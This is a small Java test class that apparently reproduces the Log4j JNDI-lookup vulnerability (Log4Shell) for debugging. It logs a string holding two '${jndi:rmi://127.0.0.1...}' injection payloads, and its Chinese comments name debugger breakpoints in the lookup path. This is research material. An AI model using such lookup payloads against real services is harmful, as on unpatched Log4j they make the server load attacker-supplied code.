import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class MainTest {
    private static final Logger logger = LogManager.getLogger(MainTest.class);
    /*
    *
    * 断点位置1：org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender         getLayout().encode(event, manager);
    * 断点位置2：javax.naming.InitialContext                                                 return getURLOrDefaultInitCtx(name).lookup(name);
    */
    public static void main(String[] args) {
        logger.error("${jndi:rmi://127.0.0.1:1099/q1bfjd}xxxxxx${jndi:rmi://127.0.0.1:1080/asewr}");
    }
}